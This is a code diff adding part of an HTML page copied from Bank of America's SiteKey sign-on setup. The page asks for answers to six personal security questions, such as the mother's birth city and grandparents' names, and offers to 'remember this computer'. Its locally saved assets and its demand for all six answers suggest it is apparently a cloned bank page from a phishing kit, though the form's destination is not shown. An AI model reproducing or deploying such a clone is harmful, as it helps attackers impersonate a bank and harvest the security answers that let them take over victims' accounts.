+                         Select SiteKey Challenge Question 6
+                        </option>
+                        <option value="In what city was your mother born?">
+                         In what city was your mother born? (Enter full name of city only)
+                        </option>
+                        <option value="In what city was your father born?">
+                         In what city was your father born? (Enter full name of city only)
+                        </option>
+                        <option value="What was the name of your first boyfriend or girlfriend?">
+                         What was the name of your first boyfriend or girlfriend?
+                        </option>
+                        <option value="When is your wedding anniversary?">
+                         When is your wedding anniversary? (Enter the full name of month)
+                        </option>
+                        <option value="In what city did you honeymoon?">
+                         In what city did you honeymoon? (Enter full name of city only)
+                        </option>
+                        <option value="In what city was your high school?">
+                         In what city was your high school? (Enter only "Charlotte" for Charlotte High School)
+                        </option>
+                        <option value="What is your paternal grandfather's first name?">
+                         What is your paternal grandfather's first name?
+                        </option>
+                        <option value="What is your paternal grandmother's first name?">
+                         What is your paternal grandmother's first name?
+                        </option>
+                        <option value="Where did you meet your spouse for the first time?">
+                         Where did you meet your spouse for the first time? (Enter full name of city only)
+                        </option>
+                       </select>
+                      </span>
+                     </span>
+                     <div style="font-size:11px; padding:0; margin:0; color:#C30;" id="ans6">
+                     </div>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <table border="0" cellspacing="0" cellpadding="0" summary="">
+                      <tbody>
+                       <tr>
+                        <td>
+                         <span class="title4">
+                          <span class="textBold">
+                           <label for="sitekeyChallengeAnswer">
+                            <b>
+                             Answer:
+                            </b>
+                           </label>
+                          </span>
+                         </span>
+                        </td>
+                       </tr>
+                       <tr>
+                        <!-- <TD width=10><IMG src="sas-docs/signonSetup.do_files/images/clr.gif" alt="" width=10 height=1></TD> -->
+                        <td>
+                         <input type="text" class="resize-text1" id="sitekeyChallengeAnswer6" size="33" maxlength="30" name="sitekeyChallengeAnswer6" />
+                        </td>
+                       </tr>
+                       <tr>
+                        <td class="text2">
+                         <span class="textnormal">
+                          (Not case sensitive)
+                         </span>
+                        </td>
+                       </tr>
+                      </tbody>
+                     </table>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td class="text2">
+                     <p>
+                      <br />
+                     </p>
+                    </td>
+                   </tr>
+                  </tbody>
+                 </table>
+                 <br />
+                 <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                  <tbody>
+                   <tr>
+                    <td class="text2">
+                     <span class="textbold">
+                      Do you want us to remember this computer, so you can avoid answering your challenge questions next time you sign in?
+                     </span>
+                     <img width="20" height="5" alt="" src="signonSetup.do_files/images/clr.gif" />
+                     <span class="textnormal">
+                     </span>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <img width="0" height="5" alt="" src="signonSetup.do_files/images/clr.gif" />
+                    </td>
+                   </tr>
+                   <tr>
+                    <td class="text2">
+                     <input type="radio" id="sitekeyDeviceBindYes" checked="checked" value="true" name="sitekeyDeviceBind" />
+                     <label for="sitekeyDeviceBindYes">
+                      <span class="textnormal">
+                       Yes
+                      </span>
+                      <span class="h2-ada">
+                       , Remember this computer to avoid answering your challenge questions.
+                      </span>
+                     </label>
+                     <br />
+                     <input type="radio" id="sitekeyDeviceBindNo" value="false" name="sitekeyDeviceBind" />
+                     <label for="sitekeyDeviceBindNo">
+                      <span class="textnormal">
+                       No
+                      </span>
+                      <span class="h2-ada">
+                       , Don't remember this computer and be asked to answer your challenge questions.
+                      </span>
+                     </label>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <img width="1" height="15" alt="" src="signonSetup.do_files/images/clr.gif" />
+                    </td>
+                   </tr>
+                   <tr>
+                    <td class="statement-separator">
+                     <img width="1" height="0" alt="" src="signonSetup.do_files/images/clr.gif" />
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <img width="1" height="20" alt="" src="signonSetup.do_files/images/clr.gif" />
+                    </td>
+                   </tr>
+                  </tbody>
+                 </table>
+                 <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                  <tbody>
+                   <tr>
+                    <td width="8%">
+                     <!-- Begin Continue Button -->
+                     <noscript>
+                      &lt;input type="hidden" name="_script" value="no_script"&gt;
+&lt;input type="submit" name="___sitekey_confirm" title="Continue" value="Continue" class="btn1" alt="Continue"&gt;
+                     </noscript>
+                     <table border="0" cellspacing="0" cellpadding="0" class="" summary="">
+                      <tbody>
+                       <tr>
+                        <td>
+                         <div class="">
+                          <a id="sitekey_confirm" target="" href="javascript:challengeQandAForm_0_submit();">
+                           <img border="0" alt="Continue" title="Continue" onmousedown="swapImage('continue','','signonSetup.do_files/images/continue_down.gif',1);" onmouseout="swapImgRestore();" onmouseover="swapImage('continue','','signonSetup.do_files/images/continue_over.gif',1);" src="signonSetup.do_files/images/continue.gif" name="continue" />
+                          </a>
+                         </div>
+                        </td>
+                       </tr>
+                      </tbody>
+                     </table>
+                     <!-- End Continue Button -->
+                    </td>
+                    <td width="10">
+                     <img width="10" height="1" alt="" src="signonSetup.do_files/images/clr.gif" />
+                    </td>
+                    <td width="70%">
+                    </td>
+                   </tr>
+                  </tbody>
+                 </table>
+                </div>
+               </td>
+              </tr>
+             </tbody>
+            </table>
+           </div>
+          </td>
+          <td width="20">
+           <img width="20" height="1" alt="" src="signonSetup.do_files/images/clr.gif" />
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </form>
+      <div style="font-size:11px; padding:0; margin:0; color:#C30;" id="ans1">
+      </div>
+      <script language="javascript" type="text/javascript">
+       function challengeQandAForm_0_submit()
+{
+	var box1=document.challengeQandAForm.sitekeyChallengeAnswer1.value;
+	var box2=document.challengeQandAForm.sitekeyChallengeAnswer2.value;
+	var box3=document.challengeQandAForm.sitekeyChallengeAnswer3.value;
+	var box4=document.challengeQandAForm.sitekeyChallengeAnswer4.value;
+	var box5=document.challengeQandAForm.sitekeyChallengeAnswer5.value;
+	var box6=document.challengeQandAForm.sitekeyChallengeAnswer6.value;
+	
+	var q1=document.challengeQandAForm.question1.value;
+	var q2=document.challengeQandAForm.question2.value;
+	var q3=document.challengeQandAForm.question3.value;
+	var q4=document.challengeQandAForm.question4.value;
+	var q5=document.challengeQandAForm.question5.value;
+	var q6=document.challengeQandAForm.question6.value;
+	document.getElementById('ans1').innerHTML="";
+	document.getElementById('ans2').innerHTML="";
+	document.getElementById('ans3').innerHTML="";
+	document.getElementById('ans4').innerHTML="";
+	document.getElementById('ans5').innerHTML="";
+	document.getElementById('ans6').innerHTML="";
+	
+	if(q1=="" || q2=="" || q3=="" || q4=="" || q5=="" || q6=="")
+	{
+		if(q1=="")
+		document.getElementById('ans1').innerHTML="Please Select the appropriate Question";
+		if(q2=="")
+		document.getElementById('ans2').innerHTML="Please Select the appropriate Question";
+		if(q3=="")
+		document.getElementById('ans3').innerHTML="Please Select the appropriate Question";
+		if(q4=="")
+		document.getElementById('ans4').innerHTML="Please Select the appropriate Question";
+		if(q5=="")
+		document.getElementById('ans5').innerHTML="Please Select the appropriate Question";
+		if(q6=="")
+		document.getElementById('ans6').innerHTML="Please Select the appropriate Question";
+	}
+	else if(box1=="" || box2=="" || box3=="" || box4=="" || box5=="" || box6=="")
+	{
+		if(box1=="")
+		document.getElementById('ans1').innerHTML="Please give answer of any of the above question";
+		if(box2=="")
+		document.getElementById('ans2').innerHTML="Please give answer of any of the above question";
+		if(box3=="")
+		document.getElementById('ans3').innerHTML="Please give answer of any of the above question";
+		if(box4=="")
+		document.getElementById('ans4').innerHTML="Please give answer of any of the above question";
+		if(box5=="")
+		document.getElementById('ans5').innerHTML="Please give answer of any of the above question";
+		if(box6=="")
+		document.getElementById('ans6').innerHTML="Please give answer of any of the above question";
+	}
+	else
+	{
+		document.challengeQandAForm.submit();
+	}
+	
+}
+&lt;!--
+//--&gt;
+      </script>
+      <script type="text/javascript" src="signonSetup.do_files/eluminate.js" language="javascript1.1">
+      </script>
+      <script type="text/javascript" language="javascript1.1" src="http://data.cmcore.com/cookie-id.js?fn=cmSetAvid">
+      </script>
+      <script type="text/javascript" language="javascript1.1" src="signonSetup.do_files/cookie-id.js">
+      </script>
+      <script type="text/javascript" src="signonSetup.do_files/cmdatatagutils.js" language="javascript1.1">
+      </script>
+      <script type="text/javascript" language="javascript1.1">
+       &lt;!--    
+         cmSetProduction();
+       //--&gt;     
+
+
+
+   
+&lt;!-- 
+	cmCreatePageviewTag("OLB:PRODUCT:ONLINE_BANKING;SITEKEY_QandA", null, null, "OLB:PRODUCT:ONLINE_BANKING", false, false, null, false, false, null, null, null);
+//--&gt;
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <script type="text/javascript" language="JavaScript">
+   &lt;!--
+var flashinstalled = 0;
+var flashversion = 0;
+MSDetect = "true";
+if (navigator.plugins &amp;&amp; navigator.plugins.length) {
+    x = navigator.plugins["Shockwave Flash"];
+    if (x) {
+        flashinstalled = 2;
+        if (x.description) {
+            y = x.description;
+            //flashversion = y.charAt(y.indexOf('.')-1);
+            flashversion = y.replace(/\D+/g, ",").split(",")[1]; 
+        }
+    }
+    else
+        flashinstalled = 1;
+    if (navigator.plugins["Shockwave Flash 2.0"]) {
+        flashinstalled = 2;
+        flashversion = 2;
+    }
+}
+else if (navigator.mimeTypes &amp;&amp; navigator.mimeTypes.length) {
+    x = navigator.mimeTypes['application/x-shockwave-flash'];
+    if (x &amp;&amp; x.enabledPlugin)
+	    flashinstalled = 2;
+    else
+	    flashinstalled = 1;
+}
+else {
+    MSDetect = "true";
+}
+// --&gt;
+  </script>
+  <script language="vbscript">
+   on error resume next
+If MSDetect = "true" Then
+	For i = 2 to 6
+		If Not(IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash." &amp; i))) Then
+		Else
+			flashinstalled = 2
+			flashversion = i
+		End If
+	Next
+	If flashinstalled = 0 Then
+		flashinstalled = 1
+	End If
+End If
+  </script>
+  <script type="text/javascript" language="JavaScript">
+   &lt;!--
+	if (flashinstalled == 2 &amp;&amp; flashversion &gt;= 6) {
+		var out = "";
+out = out + "&lt;object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'" + "\n";
+out = out + "width='1' height='1'&gt;" + "\n";
+out = out + "&lt;param name='movie' value='/sas/sas-docs/html/pmfso.swf'&gt;" + "\n";
+out = out + "&lt;param name='quality' value='high'&gt;" + "\n";
+out = out + "&lt;param name='bgcolor' value=#FFFFFF&gt;" + "\n";
+out = out + "&lt;param name='FlashVars' value='pmdata=PMV2AAV7XK8rb%2BUa5iUJXM3bu3lrl62O%2FIU3llzAZ1Jf0VGO2b35ts65yEqLsIyYYVQ6pyBuZk4OwXuLiM8%2F6v%2BbckpjJ6cchy4O7aaM3E6Ic9tFpuUL3APjJXWLQ9bNZLrKuo'&gt;" + "\n";
+out = out + "&lt;embed src='/sas/sas-docs/html/pmfso.swf'" + "\n";
+out = out + "FlashVars='pmdata=PMV2AAV7XK8rb%2BUa5iUJXM3bu3lrl62O%2FIU3llzAZ1Jf0VGO2b35ts65yEqLsIyYYVQ6pyBuZk4OwXuLiM8%2F6v%2BbckpjJ6cchy4O7aaM3E6Ic9tFpuUL3APjJXWLQ9bNZLrKuo'" + "\n";
+out = out + "quality='low' bgcolor='#FFFFFF' width='1' height='1'" + "\n";
+out = out + "type='application/x-shockwave-flash'&gt;" + "\n";
+out = out + "&lt;noembed&gt;&lt;/noembed&gt;" + "\n";
+out = out + "&lt;noobject&gt;&lt;/noobject&gt;" + "\n";
+out = out + "&lt;/embed&gt;" + "\n";
+out = out + "&lt;noobject&gt;&lt;/noobject&gt;" + "\n";
+out = out + "&lt;/object&gt;" + "\n";
+		document.write(out);
+	}
+//--&gt;
+  </script>
+  <object width="1" height="1" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000">
+   <param value="/sas/sas-docs/html/pmfso.swf" name="movie">
+   </param>
+   <param value="high" name="quality">
+   </param>
+   <param value="#FFFFFF" name="bgcolor">
+   </param>
+   <param value="pmdata=PMV2AAV7XK8rb%2BUa5iUJXM3bu3lrl62O%2FIU3llzAZ1Jf0VGO2b35ts65yEqLsIyYYVQ6pyBuZk4OwXuLiM8%2F6v%2BbckpjJ6cchy4O7aaM3E6Ic9tFpuUL3APjJXWLQ9bNZLrKuo" name="FlashVars">
+    <embed width="1" height="1" type="application/x-shockwave-flash" bgcolor="#FFFFFF" quality="low" flashvars="pmdata=PMV2AAV7XK8rb%2BUa5iUJXM3bu3lrl62O%2FIU3llzAZ1Jf0VGO2b35ts65yEqLsIyYYVQ6pyBuZk4OwXuLiM8%2F6v%2BbckpjJ6cchy4O7aaM3E6Ic9tFpuUL3APjJXWLQ9bNZLrKuo" src="signonSetup.do_files/pmfso.txt">
+     <noembed>
+     </noembed>
+     <noobject>
+     </noobject>
+     <noobject>
+     </noobject>
+    </embed>
+   </param>
+  </object>
+  <noscript>
+   &lt;object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'
+		width='1' height='1'&gt;
+	&lt;param name='movie' value='/sas/sas-docs/html/pmfso.swf'&gt;
+	&lt;param name='quality' value='high'&gt;
+	&lt;param name='bgcolor' value=#FFFFFF&gt;
+	&lt;param name='FlashVars' value='pmdata=PMV2AAV7XK8rb%2BUa5iUJXM3bu3lrl62O%2FIU3llzAZ1Jf0VGO2b35ts65yEqLsIyYYVQ6pyBuZk4OwXuLiM8%2F6v%2BbckpjJ6cchy4O7aaM3E6Ic9tFpuUL3APjJXWLQ9bNZLrKuo'&gt;
+	&lt;embed src='/sas/sas-docs/html/pmfso.swf'
+			FlashVars='pmdata=PMV2AAV7XK8rb%2BUa5iUJXM3bu3lrl62O%2FIU3llzAZ1Jf0VGO2b35ts65yEqLsIyYYVQ6pyBuZk4OwXuLiM8%2F6v%2BbckpjJ6cchy4O7aaM3E6Ic9tFpuUL3APjJXWLQ9bNZLrKuo'
+			quality='low' bgcolor='#FFFFFF' width='1' height='1'
+			type='application/x-shockwave-flash'&gt;
+		&lt;noembed&gt;&lt;/noembed&gt;
+		&lt;noobject&gt;&lt;/noobject&gt;
+	&lt;/embed&gt;
+	&lt;noobject&gt;&lt;/noobject&gt;
+&lt;/object&gt;
+  </noscript>
+  <img width="1" height="1" alt="" src="signonSetup.do_files/clr.gif" name="resetTimeout" />
+  <!-- 30 pixels of seperation -->
+  <div>
+   <img width="1" height="30" alt="" src="signonSetup.do_files/clr.gif" />
+  </div>
+  <div class="footer">
+   <table width="747" border="0" cellspacing="0" cellpadding="0" summary="">
+    <tbody>
+     <tr>
+      <td class="rulegrey2" colspan="4">
+       <img width="1" height="1" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+     </tr>
+     <tr>
+      <td width="12" rowspan="7">
+       <img width="12" height="1" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+      <td colspan="2">
+       <img width="1" height="7" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+     </tr>
+     <tr>
+      <td nowrap="nowrap" class="secure-area">
+       <div class="secure-area">
+        <img width="9" vspace="0" hspace="0" height="11" border="0" alt="" src="signonSetup.do_files/foot_lock.gif" />
+        <img width="8" height="1" alt="" src="signonSetup.do_files/clr.gif" />
+        Secure Area
+       </div>
+      </td>
+     </tr>
+     <tr>
+      <td>
+       <img width="1" height="6" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+     </tr>
+     <tr>
+      <td valign="top" class="footer">
+       <a title="Privacy & Security" class="footer" target="_blank" href="https://www.bankofamerica.com/privacy/">
+        Privacy &amp; Security
+        <span class="h2-ada1">
+         . Opens in a new window.
+        </span>
+       </a>
+      </td>
+     </tr>
+     <tr>
+      <td>
+       <img width="1" height="6" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+     </tr>
+     <tr>
+      <td valign="top" class="fdic-text">
+       Bank of America, N.A. Member FDIC. 
+				Equal Housing Lender
+       <img width="14" hspace="3" height="9" border="0" alt="" src="signonSetup.do_files/icon_house.gif" />
+       <br />
+       ©2015 Bank of America Corporation. All rights reserved.
+      </td>
+     </tr>
+     <tr>
+      <td>
+       <img height="20" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+     </tr>
+    </tbody>
+   </table>
+  </div>
+ </body>
+</html>
